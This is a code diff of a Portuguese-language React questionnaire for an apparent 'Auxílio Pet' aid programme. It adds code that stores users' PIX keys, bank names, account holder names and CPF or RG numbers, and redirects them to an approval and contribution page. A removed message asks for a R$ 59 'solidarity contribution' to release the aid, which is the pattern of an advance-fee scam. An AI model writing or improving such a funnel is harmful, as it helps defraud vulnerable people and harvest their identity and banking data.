@@ -1,6 +1,6 @@
 import { useState, useEffect, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { Sparkles, User, ArrowLeft, Send, ShieldCheck } from 'lucide-react';
+import { Sparkles, ArrowLeft, Send, ShieldCheck } from 'lucide-react';
 import { supabase } from '../lib/supabase';
 import { useAnalytics } from '../hooks/useAnalytics';
 
@@ -24,12 +24,14 @@ function Questionario() {
   const messageIdRef = useRef(0);
   const { trackButtonClick } = useAnalytics('questionario');
 
+  // Força a mensagem a ficar no CENTRO da tela
   const scrollToBottom = () => {
-    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
+    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
   };
 
   useEffect(() => {
-    scrollToBottom();
+    const timeoutId = setTimeout(scrollToBottom, 100);
+    return () => clearTimeout(timeoutId);
   }, [messages, showButtons, isTyping, showInput]);
 
   useEffect(() => {
@@ -62,7 +64,8 @@ function Questionario() {
       }
 
       if (question.type === 'end_flow') {
-        setTimeout(() => navigate('/pagamento'), 4000);
+        // Redireciona para a tela de APROVAÇÃO (fluxo novo)
+        setTimeout(() => navigate('/aprovacao'), 1500); 
         return;
       }
 
@@ -86,7 +89,10 @@ function Questionario() {
     
     const nextStep = getNextStep(currentStep);
     
-    if (nextStep === 'END') {
+    // CORREÇÃO CRÍTICA AQUI:
+    // Antes estava "END", mas o fluxo redireciona no "FINAL_MSG".
+    // Agora salvamos assim que o próximo passo for "FINAL_MSG".
+    if (nextStep === 'FINAL_MSG' || nextStep === 'END') {
        saveAnswers(nextData);
     }
 
@@ -101,13 +107,58 @@ function Questionario() {
     setInputText("");
   };
 
+  // --- FUNÇÃO DE SALVAR COMPLETA ---
   const saveAnswers = async (finalData: any) => {
     try {
       const registrationId = localStorage.getItem('registration_id');
+      console.log("Tentando salvar dados para ID:", registrationId); // Log para debug
+
       if (registrationId) {
-        await supabase.from('pet_questionnaire').insert([{ registration_id: registrationId, ...finalData }]);
+        
+        // 1. DADOS DO PET (Tabela pet_questionnaire)
+        const questionnairePayload = {
+          registration_id: registrationId,
+          quantidade_pets: parseInt(finalData["Q1"]) || 1,
+          alimentacao: finalData["Q3"],
+          dificuldade_financeira: finalData["Q4"],
+          castrado: finalData["Q5"],
+          vacinas: finalData["Q6"],
+          frequencia_alimentacao: "Não informado",
+          origem: "Não informado", 
+          controle_parasitas: "Não informado",
+          emergencia_financeira: finalData["Q4"] 
+        };
+
+        // Usa 'as any' para evitar bloqueio do TypeScript
+        const { error: questError } = await (supabase.from('pet_questionnaire') as any)
+          .insert([questionnairePayload]);
+
+        if (questError) {
+            console.error("Erro ao salvar questionário:", questError);
+        } else {
+            console.log("Questionário salvo com sucesso!");
+        }
+
+        // 2. DADOS BANCÁRIOS (Tabela registrations)
+        const bankingPayload = {
+          chave_pix: finalData["Q8"],
+          instituicao_bancaria: finalData["Q9"],
+          reside_brasil: finalData["Q10"] === "Sim",
+          nome_titular: finalData["Q11"],
+          documento_titular: finalData["Q12"]
+        };
+
+        const { error: regError } = await (supabase.from('registrations') as any)
+          .update(bankingPayload)
+          .eq('id', registrationId);
+
+        if (regError) {
+            console.error("Erro ao salvar dados bancários:", regError);
+        } else {
+            console.log("Dados bancários salvos com sucesso!");
+        }
       }
-    } catch (err) { console.error(err); }
+    } catch (err) { console.error("Erro geral no saveAnswers:", err); }
   };
 
   const getQuestion = (step: string) => {
@@ -132,7 +183,7 @@ function Questionario() {
       case "Q12": return { text: "Confirme o número do CPF ou RG do titular:", type: 'input' };
       
       case "FINAL_MSG": return { 
-        text: "🤍 CONTRIBUIÇÃO SOLIDÁRIA\n\nPara concluir a liberação do Auxílio Pet e habilitar o saque imediato, é necessária a realização de uma Contribuição Solidária no valor de R$ 59,00.\n\nEssa contribuição é destinada exclusivamente às ONGs e organizações sociais que atuam no resgate, cuidado, tratamento e proteção de animais, fortalecendo a rede de apoio que permite ajudar mais famílias e seus pets.\n\nCom esse gesto solidário, evitamos que tutores precisem abandonar quem mais amam por falta de recursos, garantindo dignidade, cuidado contínuo e a ampliação do auxílio para outros animais em situação de vulnerabilidade.",
+        text: "Você será redirecionado para a tela de contribuição...",
         type: 'end_flow'
       };
       
@@ -214,8 +265,7 @@ function Questionario() {
         </div>
       </div>
 
-      
-      <main className="flex-1 container mx-auto px-4 py-6 pb-64 max-w-2xl">
+      <main className="flex-1 container mx-auto px-4 py-6 pb-96 max-w-2xl">
         <div className="space-y-6">
           {messages.map((message) => (
             <div key={message.id} className={`flex gap-3 ${message.type === 'user' ? 'justify-end' : 'justify-start'} animate-fadeInUp`}>
@@ -255,7 +305,6 @@ function Questionario() {
         </div>
       </main>
 
-      {/* Input Area (Bottom) - Fundo branco solido para não ver o chat passando por baixo */}
       <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 p-4 shadow-[0_-4px_10px_-1px_rgba(0,0,0,0.1)] z-50">
         <div className="container mx-auto max-w-2xl">
           {showButtons && getButtons()}
